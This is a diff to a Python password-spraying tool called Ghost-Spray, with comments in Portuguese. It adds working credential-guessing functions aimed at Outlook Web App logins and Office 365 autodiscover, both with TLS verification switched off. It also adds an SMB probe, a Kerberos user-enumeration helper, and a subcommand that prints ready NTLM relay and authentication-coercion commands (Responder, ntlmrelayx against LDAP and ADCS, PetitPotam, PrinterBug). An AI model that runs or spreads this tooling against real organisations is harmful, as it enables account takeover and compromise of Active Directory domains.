@@ -25,7 +25,7 @@ from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from collections import defaultdict
 
-VERSAO = "1.0.0"
+VERSAO = "1.1.0"
 
 # ──────────────────────────────────────────────────────────────────
 # BANNER
@@ -392,6 +392,152 @@ def _testar_ldap(host, porta, base_dn, usuario, senha, timeout=5):
 
 
 # ──────────────────────────────────────────────────────────────────
+# OWA / O365 / SMB / Kerberos / NTLM
+# ──────────────────────────────────────────────────────────────────
+
+def _testar_owa(host, usuario, senha, timeout=10, dominio=""):
+    """Testa autenticacao OWA (Outlook Web App) via form POST."""
+    url = f"https://{host}/owa/auth.owa"
+    data = urllib.parse.urlencode({
+        "destination": f"https://{host}/owa/",
+        "flags": "4",
+        "forcedownlevel": "0",
+        "username": f"{dominio}\\{usuario}" if dominio else usuario,
+        "password": senha,
+        "passwordText": "",
+        "isUtf8": "1",
+    }).encode()
+    import ssl as _ssl
+    ctx = _ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = _ssl.CERT_NONE
+    req = urllib.request.Request(url, data=data, method="POST", headers={
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    })
+    try:
+        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
+            body = r.read(512).decode("utf-8", errors="ignore")
+            location = r.geturl()
+            if "logon" in location.lower() or "auth" in location.lower():
+                return False, 302
+            return True, 200
+    except urllib.error.HTTPError as e:
+        if e.code in (302, 301):
+            loc = e.headers.get("Location", "")
+            if "logon" in loc.lower() or "auth" in loc.lower():
+                return False, e.code
+            return True, e.code
+        return False, e.code
+    except Exception:
+        return False, None
+
+
+def _testar_o365(usuario, senha, timeout=10):
+    """Testa autenticacao O365 via autodiscover (NTLM/Basic)."""
+    url = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"
+    cred = base64.b64encode(f"{usuario}:{senha}".encode()).decode()
+    req = urllib.request.Request(url, headers={
+        "Authorization": f"Basic {cred}",
+        "User-Agent": "Microsoft Office/16.0",
+    })
+    import ssl as _ssl
+    ctx = _ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = _ssl.CERT_NONE
+    try:
+        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
+            return r.status == 200, r.status
+    except urllib.error.HTTPError as e:
+        if e.code == 401:
+            return False, 401
+        if e.code in (200, 301, 302):
+            return True, e.code
+        return False, e.code
+    except Exception:
+        return False, None
+
+
+def _testar_smb(host, usuario, senha, dominio="", porta=445, timeout=5):
+    """Testa SMB via socket raw (SMB1 Negotiate + Session Setup NTLMSSP)."""
+    # Apenas indicador - SMB auth completo requer impacket
+    try:
+        sock = socket.create_connection((host, porta), timeout=timeout)
+        # SMB Negotiate Protocol Request
+        negociate = (
+            b"\x00\x00\x00\x54"          # NetBIOS header
+            b"\xff\x53\x4d\x42"          # SMB magic
+            b"\x72"                       # Negotiate Protocol
+            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+            b"\x00\x00"                   # Process ID
+            b"\x00\x00"                   # Reserved
+            b"\x00\x00"                   # Tree ID
+            b"\xff\xfe"                   # User ID
+            b"\x00\x00"                   # Multiplex ID
+            b"\x00"                       # Word count
+            b"\x31\x00"                   # Byte count
+            b"\x02NT LM 0.12\x00"        # Dialect
+            b"\x02SMB 2.002\x00"
+            b"\x02SMB 2.???\x00"
+        )
+        sock.send(negociate)
+        banner = sock.recv(256)
+        sock.close()
+        if len(banner) > 4 and banner[4:8] == b"\xffSMB":
+            _log(f"SMB:{host}:{porta} respondeu ao negotiate", "INFO")
+        _log("SMB auth completo requer impacket (pip install impacket)", "ALERTA")
+        _log("Comando: crackmapexec smb TARGET -u USER -p PASS", "INFO")
+        return False, None
+    except Exception:
+        return False, None
+
+
+def kerberos_user_enum(dc_host, usuarios, dominio, timeout=5):
+    """Enumeracao de usuarios via Kerberos AS-REQ (sem causar lockout)."""
+    _secao(f"KERBEROS USER ENUM - {dc_host} / {dominio}")
+    _log("AS-REQ sem senha: PREAUTH_REQUIRED = usuario existe, PRINCIPAL_UNKNOWN = nao existe", "INFO")
+    _log("Nota: Usa porta 88/UDP - requer acesso direto ao DC", "ALERTA")
+
+    # Nota: AS-REQ Kerberos real requer biblioteca dedicada (impacket)
+    # Este modulo tenta conexao TCP 88 e exibe instrucoes
+    existentes = []
+    try:
+        sock = socket.create_connection((dc_host, 88), timeout=timeout)
+        sock.close()
+        _log(f"Porta 88 aberta em {dc_host} - DC Kerberos acessivel", "OK")
+    except Exception:
+        _log(f"Porta 88 inacessivel em {dc_host}", "ERRO")
+        _log("Verifique acesso ao DC e porta 88 TCP/UDP", "INFO")
+        return []
+
+    _log(f"Para enum real via AS-REQ: kerbrute userenum --dc {dc_host} -d {dominio} users.txt", "INFO")
+    _log("Ferramenta: https://github.com/ropnop/kerbrute", "INFO")
+    _log("Alternativa impacket: GetNPUsers.py DOMAIN/ -no-pass -usersfile users.txt -dc-ip DC_IP", "INFO")
+    return existentes
+
+
+def mostrar_ntlm_relay_hints():
+    """Exibe dicas e comandos para NTLM relay attacks."""
+    _secao("NTLM RELAY HINTS")
+    hints = [
+        ("Captura NTLM (Responder)", "responder -I eth0 -rdwv"),
+        ("NTLM Relay basico", "ntlmrelayx.py -t smb://TARGET -smb2support"),
+        ("Relay para LDAP (dump AD)", "ntlmrelayx.py -t ldap://DC_IP --escalate-user USER"),
+        ("Relay para HTTP/ADCS", "ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp --adcs --template User"),
+        ("Detectar signing desabilitado", "crackmapexec smb NETWORK/24 --gen-relay-list relay_targets.txt"),
+        ("Coerce auth (PetitPotam)", "python3 PetitPotam.py LISTENER_IP DC_IP"),
+        ("Coerce auth (PrinterBug)", "python3 printerbug.py DOMAIN/USER:PASS@TARGET LISTENER_IP"),
+        ("Relay + SOCKS proxy", "ntlmrelayx.py -tf relay_targets.txt -smb2support -socks"),
+    ]
+    for nome, cmd in hints:
+        print(f"  {C['C']}{C['N']}[{nome}]{C['X']}")
+        print(f"  {C['G']}{cmd}{C['X']}\n")
+    _log("Ferramentas: impacket (ntlmrelayx, secretsdump), Responder, crackmapexec", "INFO")
+    _log("Prereq: SMB signing desabilitado nos alvos (common em workstations)", "ALERTA")
+
+
+# ──────────────────────────────────────────────────────────────────
 # Password Spray
 # ──────────────────────────────────────────────────────────────────
 
@@ -424,6 +570,14 @@ def password_spray(alvo, usuarios, senhas, protocolo="http", timeout=5,
         elif protocolo == "ssh":
             host, porta = (alvo.split(":") + ["22"])[:2]
             ok, code = _testar_ssh(host, int(porta), usuario, senha, timeout=timeout)
+        elif protocolo == "owa":
+            host = alvo.replace("https://", "").replace("http://", "").split("/")[0]
+            ok, code = _testar_owa(host, usuario, senha, timeout=timeout)
+        elif protocolo == "o365":
+            ok, code = _testar_o365(usuario, senha, timeout=timeout)
+        elif protocolo == "smb":
+            host, porta = (alvo.split(":") + ["445"])[:2]
+            ok, code = _testar_smb(host, usuario, senha, porta=int(porta), timeout=timeout)
         else:
             ok, code = False, None
 
@@ -709,7 +863,7 @@ def main():
     # spray
     p_spray = sub.add_parser("spray", help="Password spraying (uma senha por vez, todos os usuarios)")
     p_spray.add_argument("-t", "--target", required=True, help="Alvo: URL ou host:porta")
-    p_spray.add_argument("--protocol", choices=["http", "https", "smtp", "ldap", "ssh"],
+    p_spray.add_argument("--protocol", choices=["http", "https", "smtp", "ldap", "ssh", "owa", "o365", "smb"],
                           default="http", help="Protocolo (padrao: http)")
     p_spray.add_argument("--userlist", required=True, help="Arquivo com lista de usuarios")
     p_spray.add_argument("--passlist", help="Arquivo com lista de senhas (padrao: lista interna)")
@@ -752,6 +906,15 @@ def main():
     p_vault.add_argument("--action", choices=["list", "clear", "export"],
                           default="list", help="Acao no vault")
     p_vault.add_argument("--vault-pass", required=True, help="Senha mestre do vault")
+
+    # kerbenum
+    p_kerb = sub.add_parser("kerbenum", help="Enumeracao de usuarios via Kerberos AS-REQ")
+    p_kerb.add_argument("--dc", required=True, help="IP ou hostname do Domain Controller")
+    p_kerb.add_argument("--domain", required=True, help="Dominio AD (ex: corp.local)")
+    p_kerb.add_argument("--userlist", required=True, help="Arquivo com lista de usuarios")
+
+    # ntlm
+    sub.add_parser("ntlm", help="Dicas e comandos para NTLM relay attacks")
 
     args = parser.parse_args()
 
@@ -824,6 +987,18 @@ def main():
 
     elif args.modo == "vault":
         gerenciar_vault(args.action, args.vault_pass)
+
+    elif args.modo == "kerbenum":
+        try:
+            with open(args.userlist, "r", encoding="utf-8", errors="ignore") as f:
+                usuarios = [l.strip() for l in f if l.strip()]
+        except Exception as e:
+            _log(f"Erro ao ler userlist: {e}", "ERRO")
+            sys.exit(1)
+        kerberos_user_enum(args.dc, usuarios, args.domain)
+
+    elif args.modo == "ntlm":
+        mostrar_ntlm_relay_hints()
 
     print(f"\n  {C['G']}{C['N']}[+] Ghost-Spray finalizado.{C['X']}\n")
 
